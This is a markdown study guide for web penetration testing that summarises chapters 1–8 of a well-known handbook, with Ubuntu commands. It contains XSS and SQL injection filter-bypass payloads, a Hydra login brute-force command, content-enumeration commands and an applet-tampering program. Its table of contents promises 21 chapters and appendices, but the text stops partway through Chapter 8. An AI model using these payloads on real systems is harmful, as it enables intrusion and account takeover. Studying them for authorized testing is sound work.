# Web Application & Network Penetration Testing Reference
## *The Web Application Hacker's Handbook* (2nd Ed.) + *Hacking Exposed* — Ubuntu 24.04 Command Edition

> **Scope:** Every concept, payload, and command-line technique from *The Web Application Hacker's Handbook, 2nd Edition* (Stuttard & Pinto — all 21 chapters), plus a bonus Network / UNIX / Password-Cracking / Windows-IIS reference distilled from *Hacking Exposed*. Every command is adapted and tested for **Ubuntu 24.04 LTS (Noble Numbat)**.
>
> **Revision note:** This edition reorganizes the original chapter-by-chapter dump into eight thematic Parts, fixes rendering artifacts, and adds two new lookup aids — **Appendix B (Quick-Reference Command Index)** and **Appendix C (Glossary)** — so you can jump straight to a technique during a live engagement instead of scrolling through 21 chapters.

### ⚠️ Legal & Ethical Use

This document is a **study and authorized-testing reference only**. Every payload, exploit, and command below must be used solely against systems you own or are explicitly contracted/authorized to test (e.g., your own lab, a CTF, or a signed penetration-testing engagement). Running these techniques against systems without authorization is illegal in most jurisdictions and a violation of the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws elsewhere.

### How to Use This Guide

- **Parts 0–VIII** mirror the Handbook's 21 chapters, grouped into eight thematic blocks so related chapters sit together.
- Each chapter keeps its original **Core Summary** (concepts) and **Ubuntu 24.04 Commands** (hands-on) sections.
- **Appendix A** is the bonus *Hacking Exposed* material (network recon, UNIX, password cracking, Windows/IIS).
- **Appendix B** is a single-page **Quick-Reference Command Index** — grab a command by task category without reading the whole chapter.
- **Appendix C** is a **Glossary** of every acronym used in this document.
- Use `Ctrl+F` / `Cmd+F` for a vulnerability class (e.g., "XXE", "IDOR") if you don't need the full Table of Contents below.

---

## Table of Contents

**[PART 0 — Environment & Tooling](#part-0--environment--tooling)**
- [0. Ubuntu 24.04 LTS Environment Setup & Tool Arsenal](#0-ubuntu-2404-lts-environment-setup--tool-arsenal)

**[PART I — Foundations of Web Application Security](#part-i--foundations-of-web-application-security)**
- [Chapter 1: Web Application (In)security](#chapter-1-web-application-insecurity)
- [Chapter 2: Core Defense Mechanisms](#chapter-2-core-defense-mechanisms)
- [Chapter 3: Web Application Technologies](#chapter-3-web-application-technologies)

**[PART II — Reconnaissance & Application Mapping](#part-ii--reconnaissance--application-mapping)**
- [Chapter 4: Mapping the Application](#chapter-4-mapping-the-application)

**[PART III — Bypassing Controls, Authentication, Sessions & Access](#part-iii--bypassing-controls-authentication-sessions--access)**
- [Chapter 5: Bypassing Client-Side Controls](#chapter-5-bypassing-client-side-controls)
- [Chapter 6: Attacking Authentication](#chapter-6-attacking-authentication)
- [Chapter 7: Attacking Session Management](#chapter-7-attacking-session-management)
- [Chapter 8: Attacking Access Controls](#chapter-8-attacking-access-controls)

**[PART IV — Attacking Data Stores & Back-End Components](#part-iv--attacking-data-stores--back-end-components)**
- [Chapter 9: Attacking Data Stores (SQL, NoSQL, XPath, LDAP)](#chapter-9-attacking-data-stores-sql-nosql-xpath-ldap)
- [Chapter 10: Attacking Back-End Components](#chapter-10-attacking-back-end-components)

**[PART V — Attacking Application Logic & Users](#part-v--attacking-application-logic--users)**
- [Chapter 11: Attacking Application Logic](#chapter-11-attacking-application-logic)
- [Chapter 12: Attacking Users: Cross-Site Scripting (XSS)](#chapter-12-attacking-users-cross-site-scripting-xss)
- [Chapter 13: Attacking Users: Other Techniques](#chapter-13-attacking-users-other-techniques)

**[PART VI — Automation, Information Disclosure & Native Apps](#part-vi--automation-information-disclosure--native-apps)**
- [Chapter 14: Automating Customized Attacks](#chapter-14-automating-customized-attacks)
- [Chapter 15: Exploiting Information Disclosure](#chapter-15-exploiting-information-disclosure)
- [Chapter 16: Attacking Native Compiled Applications](#chapter-16-attacking-native-compiled-applications)

**[PART VII — Architecture, Application Servers & Source Review](#part-vii--architecture-application-servers--source-review)**
- [Chapter 17: Attacking Application Architecture](#chapter-17-attacking-application-architecture)
- [Chapter 18: Attacking the Application Server](#chapter-18-attacking-the-application-server)
- [Chapter 19: Finding Vulnerabilities in Source Code](#chapter-19-finding-vulnerabilities-in-source-code)

**[PART VIII — Toolkit & Methodology](#part-viii--toolkit--methodology)**
- [Chapter 20: A Web Application Hacker's Toolkit](#chapter-20-a-web-application-hackers-toolkit)
- [Chapter 21: A Web Application Hacker's Methodology (Complete 13-Stage Checklist)](#chapter-21-a-web-application-hackers-methodology-complete-13-stage-checklist)

**[APPENDICES](#appendices)**
- [Appendix A: Hacking Exposed — Network, UNIX, Password Cracking & Windows/IIS](#appendix-a-bonus-reference--hacking-exposed-network-unix-linux-password-cracking--windowsiis-commands-for-ubuntu-2404)
- [Appendix B: Master Quick-Reference Command Index](#appendix-b-master-quick-reference-command-index)
- [Appendix C: Glossary of Key Terms](#appendix-c-glossary-of-key-terms)

---

<a id="part-0--environment--tooling"></a>

**PART 0 — ENVIRONMENT & TOOLING**
*Provisioning an Ubuntu 24.04 LTS workstation with every tool referenced in this guide.*

---

## 0. Ubuntu 24.04 LTS Environment Setup & Tool Arsenal

Many tools referenced in the book have modern package equivalents or require specific flags on **Ubuntu 24.04 LTS**. Run the following commands to provision your Ubuntu 24.04 workstation for every technique covered in the book:

```bash
# Update package repositories
sudo apt update && sudo apt upgrade -y

# Install core CLI utilities, network tools, and scripting dependencies
sudo apt install -y curl wget netcat-openbsd ncat stunnel4 dnsutils whois \
  traceroute tcpdump wireshark tshark apache2-utils sendmail

# Install Java JDK (for compiling JAttack.java, decompiling applets, running Burp/ZAP)
sudo apt install -y default-jdk

# Install Perl and LWP modules (for running custom SQLi and WebDAV scripts from the book)
sudo apt install -y perl libwww-perl liblwp-protocol-https-perl

# Install Web Application Security Scanners, Fuzzers, and Brute-Forcers
sudo apt install -y sqlmap hydra nikto dirb gobuster ffuf wfuzz

# Install John the Ripper & Hashcat for offline password hash cracking (Chapter 6 & 9)
sudo apt install -y john hashcat

# Install jadx (modern replacement for Jad to decompile Java bytecode on Ubuntu 24.04)
sudo apt install -y jadx
```

---

<a id="part-i--foundations-of-web-application-security"></a>

**PART I — FOUNDATIONS OF WEB APPLICATION SECURITY**
*Chapters 1–3 — the threat landscape, the four core defense pillars, and the underlying HTTP/web technologies.*

---

## Chapter 1: Web Application (In)security

### Core Summary
* **Evolution of the Web:** The World Wide Web evolved from static, one-way information repositories into complex, dynamic, two-way applications handling banking, shopping, social networking, ERP, webmail, and cloud infrastructure management.
* **The Myth of "This Site Is Secure":** Organizations routinely claim security based on **SSL/TLS** or **PCI compliance scans**. However, SSL only protects data in transit against network eavesdroppers; it does nothing to stop an attacker from sending crafted malicious input directly through the encrypted SSL tunnel to the application server.
* **Empirical Vulnerability Incidence (Authors' Testing of 100+ Apps):**
  * **Cross-Site Scripting (XSS):** 94%
  * **Cross-Site Request Forgery (CSRF):** 92%
  * **Information Leakage:** 78%
  * **Broken Access Controls:** 71%
  * **Broken Authentication:** 62%
  * **SQL Injection (SQLi):** 32%
* **The Core Security Problem: Users Can Submit Arbitrary Input:**
  * Clients are outside the server's control. Users can tamper with hidden form fields, cookies, URL parameters, and HTTP headers.
  * Users can send requests out of sequence, omit parameters, or supply parameters multiple times.
  * Users are not restricted to web browsers; they can use intercepting proxies and custom automated scripts.
* **Key Problem Factors:** Underdeveloped security awareness, custom in-house development, deceptive simplicity of modern frameworks, rapidly evolving threat profiles, resource/time constraints, overextended legacy technologies, and increasing functional demands.
* **The New Security Perimeter:** Firewalls must allow inbound HTTP/HTTPS traffic (ports 80/443), and web applications must connect to sensitive back-end databases and mainframes. The security perimeter has shifted from the network layer to the **application layer** (and even to the client side via user-targeted attacks and e-mail password resets).

---

## Chapter 2: Core Defense Mechanisms

### Core Summary
Web application defense comprises four pillars, which also make up the application's primary **attack surface**:
1. **Handling User Access:**
   * **Authentication:** Verifying that a user is who they claim to be (logins, multi-factor, account recovery).
   * **Session Management:** Tracking stateful user interactions across stateless HTTP requests using unique **session tokens** (typically stored in cookies, hidden fields, or URL query strings).
   * **Access Control:** Enforcing whether an authenticated user is authorized to perform a specific action or view specific data.
   * *Security Chain Principle:* These three mechanisms are interdependent; a flaw in any one allows an attacker to compromise the others.
2. **Handling User Input:**
   * **Reject Known Bad (Blacklisting):** Blocking known attack strings. Weakest approach; easily bypassed via case variation, encoding, alternate syntax, comments, or NULL bytes.
   * **Accept Known Good (Whitelisting):** Allowing only data that matches a strict format (e.g., alphanumeric, 6 characters). Strongest validation method where applicable.
   * **Sanitization:** Stripping or encoding/escaping dangerous characters before processing.
   * **Safe Data Handling:** Using inherently safe APIs (e.g., parameterized SQL queries) so input is never interpreted as executable code.
   * **Semantic Checks:** Validating that syntactically valid input (such as a bank account number) actually belongs to the requesting user.
   * **Boundary Validation:** Treating every internal component transition (Application Server → Database, Application Server → SOAP Service, Application Server → Browser) as a trust boundary requiring context-specific validation.
   * **Multistep Validation & Canonicalization Flaws:** Occurs when filters strip expressions non-recursively or decode input *after* validation filters run.
3. **Handling Attackers:** Graceful error handling (hiding stack traces), maintaining protected audit logs, alerting administrators to usage/business anomalies, and reacting defensively (slowing down responses or terminating sessions).
4. **Managing the Application:** Administrative interfaces are prime targets for privilege escalation, XSS against admins, and OS command/file manipulation.

### Key Payloads & Filter Bypasses (Chapter 2)
```text
# Case variation bypasses
SeLeCt

# Alternate SQL logic bypasses
or 2=2--

# Alternate XSS function bypasses
prompt('xss')

# Whitespace/Tokenizer disruption using inline SQL comments or tabs (%09)
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
<img%09onerror=alert(1) src=a>

# NULL byte (%00) string termination bypass (defeats unmanaged C/C++ WAF filters)
%00<script>alert(1)</script>

# Non-recursive sanitization bypasses
<scr<script>ipt>
....\/

# Double URL-encoding canonicalization bypass (%25 decodes to %, leaving %27 -> ')
%2527
%%2727

# HTML-encoding inside browser-decoded attributes
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >

# Unicode glyph best-fit mapping bypasses
«script»alert(1)«/script»
```

---

## Chapter 3: Web Application Technologies

### Core Summary
* **HTTP Protocol:** Message-based, stateless request/response protocol over TCP.
  * **HTTP Methods:**
    * `GET`: Retrieves resources; parameters sit in the URL query string (`?param=value`). Never use for sensitive actions or secrets (logged in history, proxy logs, and `Referer` headers).
    * `POST`: Performs actions; parameters sit in the request body. Browsers warn before reissuing `POST` requests via the Back button.
    * `HEAD`: Identical to `GET`, but server returns only HTTP headers (no message body).
    * `TRACE`: Diagnostic method; echoes the exact received request in the response body.
    * `OPTIONS`: Queries the server for supported HTTP methods on a resource (returned in the `Allow` or `Public` header).
    * `PUT`: Uploads content from the request body to the specified URL path on the server.
* **REST (Representational State Transfer):** Often places parameters directly inside the URL file path rather than the query string:
  * Query string style: `http://wahh-app.com/search?make=ford&model=pinto`
  * REST style: `http://wahh-app.com/search/ford/pinto`
* **Key HTTP Headers:**
  * *General:* `Connection`, `Content-Encoding`, `Content-Length`, `Content-Type`, `Transfer-Encoding` (`chunked`).
  * *Request:* `Accept`, `Accept-Encoding`, `Authorization`, `Cookie`, `Host` (mandatory in HTTP/1.1), `If-Modified-Since`, `If-None-Match`, `Origin`, `Referer`, `User-Agent`.
  * *Response:* `Access-Control-Allow-Origin`, `Cache-Control`, `ETag`, `Expires`, `Location`, `Pragma`, `Server`, `Set-Cookie`, `WWW-Authenticate`, `X-Frame-Options`.
* **Cookie Attributes (`Set-Cookie`):** `expires`, `domain`, `path`, `secure` (HTTPS only), `HttpOnly` (blocks `document.cookie` access in JS).
* **HTTP Status Codes:**
  * `100 Continue`, `200 OK`, `201 Created`, `301 Moved Permanently`, `302 Found`, `304 Not Modified`, `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `405 Method Not Allowed`, `413 Request Entity Too Large`, `414 Request URI Too Long`, `500 Internal Server Error`, `503 Service Unavailable`.
* **HTTP Proxies & HTTPS:** For plain HTTP, the browser sends the full URL to the proxy. For HTTPS, the browser sends `CONNECT hostname:443 HTTP/1.1` to establish a TCP tunnel.
* **HTTP Authentication:** `Basic` (Base64 encoded `username:password`), `NTLM`, and `Digest`.
* **Server-Side Technologies:** Java Platform (EJBs, POJOs, Servlets, Tomcat, WebLogic, JBoss), ASP.NET, PHP (LAMP stack), Ruby on Rails, SQL, XML, SOAP Web Services & WSDL.
* **Client-Side Technologies:** HTML/XHTML, Hyperlinks, Forms (`application/x-www-form-urlencoded` and `multipart/form-data`), CSS, JavaScript, VBScript, DOM, Ajax (`XMLHttpRequest`), JSON, Same-Origin Policy (SOP), HTML5, Browser Extensions (Java, ActiveX, Flash, Silverlight).
* **Encoding Schemes:**
  * **URL Encoding:** `%` + 2-digit hex ASCII (`%3d` = `=`, `%25` = `%`, `%20` or `+` = Space, `%0a` = Newline, `%00` = Null byte).
  * **16-bit Unicode Encoding:** `%u2215` (`/`), `%u00e9` (`é`).
  * **UTF-8 Multi-byte Encoding:** `%c2%a9` (`©`), `%e2%89%a0` (≠).
  * **HTML Encoding:** `&quot;` (`"`), `&apos;` (`'`), `&amp;` (`&`), `&lt;` (`<`), `&gt;` (`>`), Decimal `&#34;` (`"`), `&#39;` (`'`), Hex `&#x22;` (`"`), `&#x27;` (`'`).
  * **Base64 Encoding:** Processes 3-byte blocks into four 6-bit ASCII characters (`A-Z`, `a-z`, `0-9`, `+`, `/`), padded with `=`.

### Ubuntu 24.04 Encoding & HTTP Inspection Commands
```bash
# Base64 encode and decode strings from the Ubuntu 24.04 terminal
echo -n "The Web Application Hacker's Handbook" | base64
echo "VGhlIFdlYiBBcHBsaWNhdGlvbiBIYWNrZXIncyBIYW5kYm9vaw==" | base64 -d

# Hex encode and decode strings (e.g., username "daf" -> 646166)
echo -n "daf" | xxd -p
echo "646166" | xxd -r -p

# URL-encode and decode strings using Python 3 on Ubuntu 24.04
python3 -c "import urllib.parse; print(urllib.parse.quote('? & = ; + #'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('%253cscript%253e'))"

# Send raw HTTP OPTIONS, HEAD, and TRACE methods using curl
curl -i -X OPTIONS http://target.com/
curl -I http://target.com/
curl -i -X TRACE http://target.com/
```

---

<a id="part-ii--reconnaissance--application-mapping"></a>

**PART II — RECONNAISSANCE & APPLICATION MAPPING**
*Chapter 4 — enumerating content, functionality, and entry points before touching a single vulnerability.*

---

## Chapter 4: Mapping the Application

### Core Summary
1. **Enumerating Content and Functionality:**
   * **Web Spidering & `robots.txt`:** Automated crawlers parse HTML links and forms, and check `/robots.txt` for restricted paths (e.g., `Disallow: /mdsecportal/`, `Disallow: /site-old/`).
   * **Limitations of Automated Spiders:** Struggle with complex JavaScript menus (`onclick="ui_nav('Profile')"`), compiled applets, strict form validation, single-URL parameter-driven navigation (`/account.jsp`), volatile timer parameters (infinite loops), and session termination (hitting `Logout` links or triggering defensive logouts).
   * **User-Directed Spidering:** The superior method. The hacker browses manually through an intercepting proxy (Burp/ZAP) while the tool passively spiders responses, populates the site map, and preserves session state.
2. **Discovering Hidden Content:**
   * **Brute-Force Techniques:** Using wordlists (via Burp Intruder, `gobuster`, or `ffuf`) to discover unlinked directories and files. Do not assume `200 OK` vs `404 Not Found` is the only indicator; watch for `302 Found` (redirects to login), `400 Bad Request`, `401`/`403` (protected directory exists), and `500 Internal Server Error` (script exists but expects parameters).
   * **Inference from Published Content:** Deduce naming conventions (e.g., `AddDocument.jsp` and `ViewDocument.jsp` imply `EditDocument.jsp` and `RemoveDocument.jsp`; `ForgotPassword` implies `ResetPassword`).
   * **Backup & Temporary Files:** Probe for `.bak`, `.old`, `.txt`, `.src`, `.inc`, `.java`, `.cs`, `.tmp`, `file.php~1`, and OS X `.DS_Store`.
   * **Public Information:** Query search engines (`site:`, `link:`, `related:`), Google Groups/News, cached pages, the Wayback Machine (`archive.org`), and developer forum postings using employee names/e-mails.
   * **Leveraging the Web Server:** Use Nikto/Wikto to scan for default files and known vulnerable scripts (e.g., `/phpmyadmin/`, `/gb/index.php?login=true`).
3. **Application Pages vs. Functional Paths:** When an application routes all requests through a single page (e.g., `POST /bank.jsp` with `servlet=TransferFunds&method=confirmTransfer`), map the application by enumerating servlet and method parameters rather than URLs.
4. **Discovering Hidden Parameters:** Fuzz requests with debug parameter names (`debug`, `test`, `hide`, `source`) paired with values (`true`, `yes`, `on`, `1`) in both query strings and `POST` bodies.
5. **Analyzing the Application:**
   * **Entry Points for User Input:** URL file paths (REST parameters), query string parameters, `POST` body parameters, cookies, custom parameter encodings (`/dir/file?param=foo:bar`), HTTP headers (`User-Agent` spoofing for mobile interfaces, `Referer`, `X-Forwarded-For` IP spoofing), and out-of-band channels.
   * **Identifying Server-Side Technologies:** Banner grabbing (`Server:` header), HTTP fingerprinting (`httprecon` / `httprint`), file extensions (`.asp`, `.aspx`, `.jsp`, `.cfm`, `.php`, `.d2w`, `.pl`, `.py`, `.dll`, `.nsf`/`.ntf`, Vignette `,00.html`), directory names (`servlet`, `pls`, `cfdocs`/`cfide`, `SilverStream`, `WebObjects`/`.woa`, `rails`), session token names (`JSESSIONID`, `ASPSESSIONID`, `ASP.NET_SessionId`, `CFID`/`CFTOKEN`, `PHPSESSID`).
   * **Identifying Server-Side Functionality:** Dissect parameters for clues (`OrderBy=name` → SQL `ORDER BY`; `template=NewBranch.tpl` → file path traversal; `from=` & `to=` → SMTP mail injection).

### Ubuntu 24.04 Commands for Application Mapping
```bash
# 1. Inspect robots.txt and server headers
curl -k -i https://target.com/robots.txt

# 2. Run Nikto with custom CGI directories, custom 404 string, and virtual host
nikto -h http://target.com -Cgidirs /cgi/ -404 "Page Not Found" -vhost target.com

# 3. Directory & File Brute-Forcing on Ubuntu 24.04 (replaces DirBuster/Intruder)
gobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/common.txt \
  -x php,asp,aspx,jsp,bak,old,inc,txt,tmp -k

# 4. Fuzz for hidden debug parameters (Cluster Bomb equivalent using ffuf)
ffuf -u "https://target.com/login?FUZZ1=FUZZ2" \
  -w debug_names.txt:FUZZ1 -w debug_values.txt:FUZZ2 -mc all -fc 404

# 5. Spoof Mobile User-Agent and X-Forwarded-For header
curl -k -i -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" \
  -H "X-Forwarded-For: 127.0.0.1" https://target.com/
```

---

<a id="part-iii--bypassing-controls-authentication-sessions--access"></a>

**PART III — BYPASSING CONTROLS, AUTHENTICATION, SESSIONS & ACCESS**
*Chapters 5–8 — defeating client-side controls and attacking login, session tokens, and authorization.*

---

## Chapter 5: Bypassing Client-Side Controls

### Core Summary
Because the client is under the user's complete control, any security control or data transmission mechanism relying on client-side enforcement can be bypassed.
1. **Transmitting Data Via the Client:**
   * **Hidden Form Fields:** E.g., `<input type="hidden" name="price" value="449">`. Modify via an intercepting proxy (even testing negative values like `-449` to trigger credit card refunds).
   * **HTTP Cookies:** E.g., `Set-Cookie: DiscountAgreed=25`. Intercept and modify to `99`.
   * **URL Parameters & `Referer` Header:** Modify preset URL parameters or spoof `Referer: https://mdsec.net/auth/472/Admin.ashx` to bypass multistage checks.
   * **Opaque Data:** Reverse-engineer custom encodings, replay encrypted tokens from cheaper items (`pricing_token`), or feed opaque strings into other application functions that decrypt and display them.
   * **ASP.NET ViewState (`__VIEWSTATE`):** Base64-encoded serialized data structure. If `EnableViewStateMac` is not enabled (no 20-byte hash at the end), decode, modify values (like stored prices), re-encode, and submit.
2. **Capturing User Data: HTML Forms:**
   * **Length Limits (`maxlength`):** Bypass by intercepting the `POST` request in a proxy.
   * **Script-Based Validation (`onsubmit="return validateForm(this)"`):** Bypass by disabling JavaScript, editing the response script in a proxy (Note: strip `If-Modified-Since` and `If-None-Match` request headers so the server returns `200 OK` instead of `304 Not Modified`), or submitting valid data in the browser and modifying it in the proxy.
   * **Disabled Elements (`disabled="true"`):** Re-enable in HTML source or manually add the disabled parameter name/value to the `POST` request.
3. **Capturing User Data: Browser Extensions (Java, Flash, Silverlight):**
   * **Handling Serialized Data:**
     * *Java:* `Content-Type: application/x-java-serialized-object` (deserialize with DSer plugin).
     * *Flash:* `Content-Type: application/x-amf` (natively unpacked in Burp Suite).
     * *Silverlight (WCF):* `Content-Type: application/soap+msbin1` (decode with WCF Binary SOAP plugin).
   * **Decompiling Bytecode:**
     * Unpack `.jar` or `.xap` archives using `unzip`.
     * Decompile `.class` files with `jad` / `jadx`, `.swf` files with `flasm`/`flare`/`SWFScan`, and Silverlight `.dll` files with `.NET Reflector` / `ilspycmd`.
   * **Coping with Obfuscation:** Refactor meaningless symbol names in an IDE or run obfuscated bytecode through an obfuscator like `Jode` to strip redundant code paths.
   * **Attaching a Debugger:** Use `JavaSnoop` or `appletviewer` + `JSwat` for Java applets, `Silverlight Spy` for Silverlight, and `OllyDbg`/`IDA Pro` for native ActiveX controls.

### Worked Example: Decompiling, Modifying & Running a Java Applet on Ubuntu 24.04
In the book's worked example (`http://mdsec.net/shop/154/`), the `CheckQuantity.class` applet validates that `quantity` is between 1 and 50 and XOR-obfuscates it with `obfpad`. Here is how to download, decompile, strip validation, compile, and generate payloads on Ubuntu 24.04:

```bash
# 1. Download the applet bytecode
curl -s http://mdsec.net/scripts/CheckQuantity.class -o CheckQuantity.class

# 2. Decompile the .class file using jadx on Ubuntu 24.04
jadx -d decompiled_applet CheckQuantity.class
cat decompiled_applet/defpackage/CheckQuantity.java
```

Create the modified standalone Java program (`CheckQuantity.java`) with the bounds check (`if(i <= 0 || i > 50)`) removed and a `main` method added:

```java
// File: CheckQuantity.java
public class CheckQuantity {
    public static void main(String[] a) {
        String payload = a.length > 0 ? a[0] : "999";
        String obfpad = "klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5HJxpidrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9SmG7c";
        System.out.println(doCheck(payload, obfpad));
    }

    public static String doCheck(String s, String s1) {
        String s2 = (new StringBuilder()).append("rand=").append(Math.random())
            .append("&q=").append(s).append("&checked=true").toString();
        StringBuilder stringbuilder = new StringBuilder();
        for(int j = 0; j < s2.length(); j++) {
            String s3 = (new StringBuilder()).append('0').append(
                Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^ s2.charAt(j))
            ).toString();
            int k = s3.length();
            if(k > 2)
                s3 = s3.substring(k - 2, k);
            stringbuilder.append(s3);
        }
        return stringbuilder.toString();
    }
}
```

Compile and execute on Ubuntu 24.04, or attach a remote debugger to an applet:

```bash
# Compile and run the standalone payload generator on Ubuntu 24.04
javac CheckQuantity.java
java CheckQuantity "999"

# Launch an applet in debug mode listening on port 5000 for JSwat/jdb attachment
appletviewer -J-Xdebug -J-Djava.compiler=NONE \
  -J-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5000 appletpage.htm
```

---

## Chapter 6: Attacking Authentication

### Core Summary
1. **Design Flaws in Authentication:**
   * **Bad Passwords:** Weak or nonexistent complexity rules allow short passwords, dictionary words, `username == password`, or default passwords.
   * **Brute-Forcible Login:** Lack of account lockout, or storing `failedlogins=1` counters in client cookies or removable session cookies, allows automated password guessing. Even when locked out, if the server returns a subtly different message for a valid password, brute-forcing can continue during lockout.
   * **Verbose Failure Messages & Username Enumeration:** Differences in error text, HTML layout, HTTP status codes, or **response timing** (e.g., hashing password only when username exists) allow attackers to harvest valid usernames across login, registration, password change, and forgotten password pages.
   * **Vulnerable Transmission of Credentials:** Sending credentials over cleartext HTTP, loading the login page itself over HTTP (vulnerable to MITM form-action hijacking), passing credentials in URL query strings (leaked in logs/history/`Referer`), or storing credentials in cookies.
   * **Password Change Functionality:** Often lacks account lockout, allows supplying an arbitrary username, or checks whether `new_password == confirm_password` *after* validating the existing password.
   * **Forgotten Password Functionality:** Weak user-selected secret questions, password hints, lack of brute-force protection, sending recovery URLs to an attacker-modifiable e-mail parameter in the request, or dropping the user straight into an authenticated session.
   * **"Remember Me" Functionality:** Storing `RememberUser=daf` or predictable/weakly obfuscated persistent cookies.
   * **User Impersonation Functionality:** Unprotected `/admin/ImpersonateUser.jsp` endpoints, tampering with `Cookie: ImpersonateUser=30`, or discovering a global "backdoor" administrator password during brute-force attacks (when an account matches two different passwords).
   * **Incomplete Validation of Credentials:** Password truncation (only checking the first n characters), case-insensitive password matching, or stripping unusual characters.
   * **Nonunique Usernames:** Self-registration allowing duplicate usernames with different passwords (rejecting a duplicate password reveals the victim's password!).
   * **Predictable Usernames & Initial Passwords:** Sequential generation (`cust5331`, `cust5332`) or deterministic initial passwords.
   * **Insecure Distribution of Credentials:** Predictable account activation URLs.
2. **Implementation Flaws in Authentication:**
   * **Fail-Open Login Mechanisms:** Unhandled exceptions (e.g., omitting the `password` parameter entirely so `request.getParameter("password")` is `null`) caught by an empty `catch (Exception e) {}` block that proceeds to log the user in.
   * **Defects in Multistage Logins:** Skipping stages directly to stage 3, tampering with hidden state flags (`stage2complete=true`), switching usernames between stages 1 and 2, or re-initiating login repeatedly to cycle through randomly selected characters of a memorable word until the attacker gets the two characters they already know.
   * **Insecure Storage of Credentials:** Storing passwords in cleartext or unsalted MD5/SHA-1 hashes.

### Ubuntu 24.04 Authentication Attack Commands
```bash
# Breadth-first password brute-forcing using Hydra on Ubuntu 24.04
hydra -t 32 -L enumerated_users.txt -P top_passwords.txt target.com http-post-form \
  "/auth/16/Default.ashx:username=^USER^&password=^PASS^:Login failed"

# Test for Fail-Open login by omitting the password parameter completely
curl -k -i -X POST https://target.com/login.ashx -d "username=admin"
```

---

## Chapter 7: Attacking Session Management

### Core Summary
1. **The Need for State & Alternatives:**
   * Stateful sessions use **session tokens** (usually in cookies like `ASP.NET_SessionId`) to link requests to a user.
   * Alternatives include HTTP Authentication (browser sends credentials on every request) and **sessionless state mechanisms** (encrypted/signed state blobs sent via the client).
2. **Weaknesses in Token Generation:**
   * **Meaningful Tokens:** Tokens containing hex-encoded or Base64-encoded structured data, such as `757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3131` → `user=daf;app=admin;date=10/09/11`.
   * **Predictable Tokens:**
     * *Concealed Sequences:* Base64-encoded binary integers that increment by a constant hex value (e.g., +0x97C4EB6A (mod 2^32)) on each token.
     * *Time Dependency:* E.g., `3124538-1172764258718` (`<counter>-<System.currentTimeMillis()>`). By polling the server before and after another user logs in (detected when the counter jumps by >1), the attacker bounds the millisecond timestamp to a small range of a few hundred values and brute-forces it!
     * *Weak PRNGs:* E.g., `java.util.Random` linear congruential generator (seed = (seed × 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1)), or PHP ≤ 5.3.2 session IDs (`phpwn`).
     * *Testing Randomness Quality:* Use **Burp Sequencer** to capture up to 20,000 tokens and run FIPS character-level and bit-level statistical tests to measure effective entropy.
   * **Encrypted Tokens:**
     * **ECB (Electronic Codebook) Ciphers:** Encrypts fixed-size (8- or 16-byte) blocks independently. Identical plaintext blocks produce identical ciphertext blocks. Attackers can cut-and-paste ciphertext blocks (e.g., registering username `daf1` so `1;time=6` aligns on a block boundary, then copying that ciphertext block over the `uid=219;` block to become `uid=1`!).
     * **CBC (Cipher Block Chaining) Ciphers:** Each plaintext block is XORed with the previous ciphertext block before encryption. During decryption, modifying a single byte in ciphertext block C(i-1) corrupts plaintext block P(i-1) into garbage, but predictably flips the corresponding bits in plaintext block P(i)! Using Burp Intruder's **bit flipper** payload across the token allows an attacker to systematically flip bits in `uid=216` to become `uid=226` or `uid=1` without knowing the encryption key!
3. **Weaknesses in Session Token Handling:**
   * **Disclosure on the Network:** Using HTTPS only for the login request and reverting to HTTP, issuing a session token over HTTP before login and not regenerating it upon HTTPS login, loading static images/scripts over HTTP without the `secure` cookie flag, or accepting HTTP connections on port 80 when the user manually visits `http://`.
   * **Disclosure in Logs:** Passing tokens in URLs (`;jsessionid=...`) leaks them in browser history, proxy/server logs, and external `Referer` headers.
   * **Vulnerable Mapping of Tokens to Sessions:** Allowing concurrent sessions, static tokens, or failing to bind the user identity in a structured token to the random component on the server.
   * **Vulnerable Session Termination:** Failing to expire idle sessions server-side, or a logout button that only clears the cookie client-side (`document.cookie="sess=";`) while the server still accepts the token if replayed.
   * **Client Exposure to Token Hijacking:** XSS (`document.cookie`), Session Fixation, and CSRF.
   * **Liberal Cookie Scope:** Setting `domain=wahh-organization.com` exposes the session cookie to all untrusted subdomains (`testapp.wahh-organization.com`). Browsers also ignore port numbers and protocols for cookie scope, and `path` restrictions can be bypassed via same-origin `iframe` DOM access.

---

## Chapter 8: Attacking Access Controls

### Core Summary
* **Categories of Access Control:**
  * **Vertical Access Controls:** Restricting sensitive functions to specific roles (e.g., Administrator vs. Ordinary User). Broken → *Vertical Privilege Escalation*.
  * **Horizontal Access Controls:** Restricting users to their own subset of resources (e.g., viewing only your own bank account or e-mail). Broken → *Horizontal Privilege Escalation* (often escalates to vertical if you can view/edit an admin's profile/password).
  * **Context-Dependent Access Controls:** Restricting actions based on application state (e.g., enforcing sequential checkout stages).
* **Common Access Control Vulnerabilities:**
  1. **Completely Unprotected Functionality:** Admin URLs (`/admin/` or `/menus/secure/ff457/DoAdminMenu2.jsp`) hidden from regular users' UIs or exposed inside client-side JavaScript (`if (isAdmin) { ... }`), with no server-side authorization check.
  2. **Direct Access to Methods:** Remoting interfaces exposing Java methods directly in URLs or parameters (e.g., `/public/securityCheck/getCurrentUserRoles` or `servlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug`). Probe for related methods like `getAllUsers`, `getAllRoles`, `listInterfaces`.
  3. **Identifier-Based Functions (IDOR):** E.g., `/ViewDocument.php?docid=1280149120` or `/MyAccount.php?uid=79` where the server does not verify that the requested resource belongs to the logged-in session.
  4. **Multistage Functions:** Checking authorization on Stage 1 (`NewUser.ashx` form) but failing to check authorization on Stage 2 (`POST /NewUserStep2.ashx`).
